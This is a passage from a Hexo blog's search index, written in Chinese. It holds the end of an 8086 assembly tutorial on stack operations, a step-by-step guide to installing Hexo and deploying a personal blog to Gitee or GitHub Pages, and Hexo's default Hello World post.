新值。</p></li></ul><h3 id="三、堆栈操作"><a href="#三、堆栈操作" class="headerlink" title="三、堆栈操作"></a>三、堆栈操作</h3><h4 id="1、设置堆栈"><a href="#1、设置堆栈" class="headerlink" title="1、设置堆栈"></a>1、设置堆栈</h4><p>设置堆栈主要是对堆栈段寄存器 SS 和堆栈指针 SP 赋值。</p><p>例如：STACKI SEGMEMT PARA STACK<br>                         DB 100 DUP （0）<br>            STACKI ENDS</p><p>第一行中的PARA STACK 就是用来说明本段为堆栈段。<br>当程序经过汇编、连接并装入内存时，系统将自动为其分配一个存储区作为堆栈段，将这个段的段基址的高 16 位送入 SS 中，将程序指定的字节单元数 100 赋值给 SP 。</p><h4 id="2、进栈-PUSH"><a href="#2、进栈-PUSH" class="headerlink" title="2、进栈 PUSH"></a>2、进栈 PUSH</h4><p>进栈就是把数据存入堆栈。由指令 PUSH 或者由机器自动实现，可以将通用寄存器、段寄存器或字存储单元的内容压入堆栈顶部。</p><p>例如：PUSH AX ；将寄存器 AH 的内容压入堆栈<br>            PUSH DX ；将段寄存器 DS 的内容压入堆栈<br>            PUSH DATA-WORD ；将字存储单元 DATA-WORD 压入堆栈<br>            PUSHF ；将标志寄存器内容压入堆栈</p><p>进栈的执行过程：<br>（1）首先将堆栈指针 SP 减 2 ，指向一个空的堆栈字单元。即：SP = SP - 2<br>（2）将要储存的内容（寄存器或存储单元的内容）送入 SP 指向的字单元中。即：（SP）= 数据</p><h4 id="3、出栈-POP"><a href="#3、出栈-POP" class="headerlink" title="3、出栈 POP"></a>3、出栈 POP</h4><p>出栈操作由 POP 指令或机器自动实现，它从堆栈顶部弹出一个字到通用寄存器、段寄存器或字存储单元。</p><p>例如：POP AX ；将栈顶字单元内容弹出到 AX<br>            POP DS ；将栈顶字单元内容弹出到 DS<br>            POP DATA-WORD ；将栈顶字单元内容弹出到字存储单元 DATA-WORD<br>            POPF ；将栈顶字单元内容送回标志寄存器 F 。</p><p>出栈的操作过程：<br>（1）将 SP 指向的字单元（即栈顶字单元）内容送往指定的寄存器或存储器。<br>          即：寄存器/存储器 = （SP）<br>（2）堆栈指针 SP 加 2 ，即：SP = SP + 2</p><h1 id="第三章-寻址方式与指令系统"><a href="#第三章-寻址方式与指令系统" class="headerlink" title="第三章 寻址方式与指令系统"></a>第三章 寻址方式与指令系统</h1><h2 id="3-1-寻址方式"><a href="#3-1-寻址方式" class="headerlink" title="3.1 寻址方式"></a>3.1 寻址方式</h2><h2 id="3-2-指令系统"><a href="#3-2-指令系统" class="headerlink" title="3.2 指令系统"></a>3.2 指令系统</h2><h2 id="3-3-指令编码"><a href="#3-3-指令编码" class="headerlink" title="3.3 指令编码"></a>3.3 指令编码</h2>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
      <tag>Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Hexo框架的个人博客搭建</title>
    <link href="/2021/07/26/MessUp/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/07/26/MessUp/%E5%9F%BA%E4%BA%8EHexo%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p><strong>Hexo</strong> 是一个快速、简洁且高效的博客框架。<strong>Hexo</strong> 使用 <a href="http://daringfireball.net/projects/markdown/">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>这里，只是简单地介绍了基于 <strong>Hexo</strong> 框架的个人博客搭建，更为详细、具体的命令和操作可以去 <strong>Hexo</strong> 官网查看。</p><p><strong>Hexo</strong> 官网：<a href="https://hexo.io/zh-cn/">Hexo</a></p><h2 id="一、依赖软件安装"><a href="#一、依赖软件安装" class="headerlink" title="一、依赖软件安装"></a>一、依赖软件安装</h2><p><strong>Hexo</strong> 的安装和运行依赖 <strong>Node.js</strong> 和 <strong>Git</strong> 两个软件：</p><ul><li><p>安装官网：<a href="https://nodejs.org/en/">Node.js (nodejs.org)</a></p></li><li><p>安装官网：<a href="https://git-scm.com/">Git (git-scm.com)</a></p></li></ul><h3 id="1、Git-的安装"><a href="#1、Git-的安装" class="headerlink" title="1、Git 的安装"></a>1、Git 的安装</h3><p>1）下载相应版本，进行安装，所有设置可以默认。</p><p>2）打开 <strong>bash 或者 cmd</strong>，查看 <strong>Git</strong> 是否安装成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git --version<br>git version 2.30.1.windows.1<br></code></pre></td></tr></table></figure><p>关于 <strong>Git</strong> 和 <strong>Gitee</strong> 的配置和使用可以看《Git-Gitee初步配置及使用》。</p><h3 id="2、Node-js-的安装"><a href="#2、Node-js-的安装" class="headerlink" title="2、Node.js 的安装"></a>2、Node.js 的安装</h3><p>1）下载 <strong>LTS</strong> 版本，进行安装，所有设置可以默认。</p><p>2）打开 <strong>bash 或者 cmd</strong>，查看 <strong>node</strong> 和 <strong>npm</strong> 是否安装成功</p><blockquote><p>安装 <strong>node</strong> 的同时也安装了 <strong>npm</strong> ，<strong>npm</strong> 是 <strong>nodejs</strong>  的包管理工具。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ node -v<br>v14.17.3<br><br>$ npm -v<br>6.14.13<br></code></pre></td></tr></table></figure><blockquote><p>如果 <strong>cmd</strong> 中运行以上命令显示<strong>不是内部或外部命令，也不是可运行的程序或批处理文件</strong>，那么可能安装时添加环境变量失败，可以自行添加或者在<strong>开始</strong>的最近添加中找到并打开 <strong>Node.js command prompt</strong> ，在其中使用命令行。</p></blockquote><p>3）由于国外镜像源很慢，用 <strong>npm</strong> 国内淘宝的源全局安装 <strong>cnpm</strong> ，以代替 <strong>npm</strong> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install -g cnpm --registry=https://registry.npm.taobao.org<br>$ cnpm -v         <span class="hljs-comment">#查看是否安装成功</span><br></code></pre></td></tr></table></figure><p>这里也可以不安装 <strong>cnpm</strong> ，只配置 <strong>npm</strong> 国内淘宝的源，以加快下载速度。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br>$ npm config get registry           <span class="hljs-comment">#查看是否配置成功</span><br>https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><h2 id="二、安装-Hexo-框架"><a href="#二、安装-Hexo-框架" class="headerlink" title="二、安装 Hexo 框架"></a>二、安装 Hexo 框架</h2><p>1、用 <strong>cnpm</strong> 全局安装 <strong>Hexo</strong> 的命令行工具 <strong>hexo-cli</strong> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>2、用 <code>hexo -v</code> 查看是否安装成功。看到以下输出，说明安装成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo -v<br>hexo-cli: 4.3.0<br>os: win32 10.0.19043<br>node: 14.17.3<br>v8: 8.4.371.23-node.67<br>uv: 1.41.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.17.1<br>modules: 83<br>nghttp2: 1.42.0<br>napi: 8<br>llhttp: 2.1.3<br>openssl: 1.1.1k<br>cldr: 39.0<br>icu: 69.1<br>tz: 2021a<br>unicode: 13.0<br><br></code></pre></td></tr></table></figure><h2 id="三、使用-Hexo-搭建博客"><a href="#三、使用-Hexo-搭建博客" class="headerlink" title="三、使用 Hexo 搭建博客"></a>三、使用 Hexo 搭建博客</h2><p>1、初始化博客：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mkdir blog     <span class="hljs-comment">#建立 blog 目录</span><br>$ <span class="hljs-built_in">cd</span> blog        <span class="hljs-comment">#进入 blog 目录</span><br>$ <span class="hljs-built_in">pwd</span>                  <span class="hljs-comment">#查看所在目录</span><br>$ hexo init            <span class="hljs-comment">#初始化博客</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo init blog      <span class="hljs-comment">#创建文件 blog，并初始化博客</span><br>$ <span class="hljs-built_in">cd</span> blog             <span class="hljs-comment">#进入 blog 目录</span><br></code></pre></td></tr></table></figure><p>目录为文件所在目录，所以可以自行决定目录名称和路径 。</p><p>2、启动博客：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s       <span class="hljs-comment">#简写</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.<br></code></pre></td></tr></table></figure><p>如果启动博客时遇到防火墙，点击允许访问即可。</p><p>可以通过 <a href="http://localhost:4000">http://localhost:4000</a> 去访问博客，<strong>Ctrl + C</strong> 停止。</p><h2 id="四、新建一篇博客文章"><a href="#四、新建一篇博客文章" class="headerlink" title="四、新建一篇博客文章"></a>四、新建一篇博客文章</h2><p>1、新建一篇文章：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span>    <span class="hljs-comment">#新建一篇名为 My New Post 的文章</span><br></code></pre></td></tr></table></figure><p>2、清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br></code></pre></td></tr></table></figure><p><strong>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</strong></p><p>3、生成静态文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g       <span class="hljs-comment">#简写 </span><br></code></pre></td></tr></table></figure><p>4、启动博客：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br></code></pre></td></tr></table></figure><h2 id="五、将博客部署到远端"><a href="#五、将博客部署到远端" class="headerlink" title="五、将博客部署到远端"></a>五、将博客部署到远端</h2><p>这里，演示部署到 Github 或者 Gitee 上，毕竟免费，实际操作中任选其一即可 。</p><p>由于我配置了 <strong>Gitee</strong> 的 SSH，而没有配置 <strong>Github</strong> ，所以在部署到 <strong>Gitee</strong> 时，配置文件中的仓库地址我用的是 <code>SSH</code>，部署到 <strong>Github</strong> 时，用的 <code>HTTP</code> 。</p><p>具体部署到哪个平台（Github 或 Gitee 或其他）、用哪种方式（SSH 或 HTTP），视自己的情况而定，这个并没有限制 。</p><h3 id="1、部署到-Gitee"><a href="#1、部署到-Gitee" class="headerlink" title="1、部署到 Gitee"></a>1、部署到 Gitee</h3><p>1）创建仓库，用户部署个人博客的 <strong>Gitee</strong> 仓库的命名最好符合特定要求</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">仓库的名称为：用户名<br>例：keys942<br></code></pre></td></tr></table></figure><p>2）安装 <strong>Git</strong> 的部署插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cnpm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>3）配置 <strong>_config.yml</strong> 文件：</p><p>找到 <strong>104行</strong> <strong># deploy</strong> 部分：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>进行如下修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">仓库地址（例：git@gitee.com:keys942/keys942.git）</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><p>4）部署到远端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy       <span class="hljs-comment">#部署网站</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo d            <span class="hljs-comment">#简写</span><br></code></pre></td></tr></table></figure><p>5）回到 <strong>Gitee</strong> 仓库，刷新，可以看到有文件成功上传。点击 <strong>「服务」-&gt;「Gitee Pages」</strong>，打开 <code>Gitee Pages</code> 服务。默认操作下直接点击「<strong>启动</strong>」并确认，即可开启服务 。</p><p>6）访问地址：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">用户名.gitee.io<br>例：keys942.gitee.io<br></code></pre></td></tr></table></figure><h3 id="2、部署到-Github"><a href="#2、部署到-Github" class="headerlink" title="2、部署到 Github"></a>2、部署到 Github</h3><p>1）创建仓库，用户部署个人博客的 <strong>Github</strong> 仓库的命名必须符合特定要求才行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">仓库的名称为：用户名<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span><br>例：keys942<span class="hljs-selector-class">.github</span>.io<br></code></pre></td></tr></table></figure><p>2）安装 <strong>Git</strong> 的部署插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cnpm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>3）配置 <strong>_config.yml</strong> 文件：</p><p>找到 <strong>104 行</strong> <strong># deploy</strong> 部分：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>进行如下修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">仓库地址（例：https://github.com/keys942/keys942.github.io.git）</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br></code></pre></td></tr></table></figure><p>4）部署到远端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy       <span class="hljs-comment">#部署网站</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo d            <span class="hljs-comment">#简写</span><br></code></pre></td></tr></table></figure><p>因为用的是 <strong>HTTPS</strong> ，所以会要求输入 <strong>Github</strong> 用户名和密码 。</p><p>5）访问地址：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">用户名.github.io<br>例：keys942.github.io<br></code></pre></td></tr></table></figure><h2 id="六、更换主题"><a href="#六、更换主题" class="headerlink" title="六、更换主题"></a>六、更换主题</h2><p>不同的主题在下载和配置上有所不同，这里以主题 <code>yilia</code> 为例 。</p><p>1、下载主题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia      <span class="hljs-comment">#克隆yilia主题到themes/yilia下</span><br></code></pre></td></tr></table></figure><p>2、修改 <strong>_config.yml</strong> 文件：</p><p>找到 <strong>100 行 theme</strong> 部分：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">theme:</span> <span class="hljs-string">landscape</span><br></code></pre></td></tr></table></figure><p>进行如下修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">theme:</span> <span class="hljs-string">yilia</span><br></code></pre></td></tr></table></figure><p>3、清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br></code></pre></td></tr></table></figure><p><strong>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</strong></p><p>4、生成静态文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g<br></code></pre></td></tr></table></figure><p>5、启动博客：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br></code></pre></td></tr></table></figure><p>本地查看，没问题后，部署到远端。</p><p>6、部署到远端（<strong>Gitee</strong>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo d      <span class="hljs-comment">#部署网站</span><br></code></pre></td></tr></table></figure><p>因为我用的是 Gitee ，所以这里我就部署到了 Gitee 。</p><p>7、访问地址：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">用户名.gitee.io<br>例：keys942.gitee.io<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/07/25/hello-world/"/>
    <url>/2021/07/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
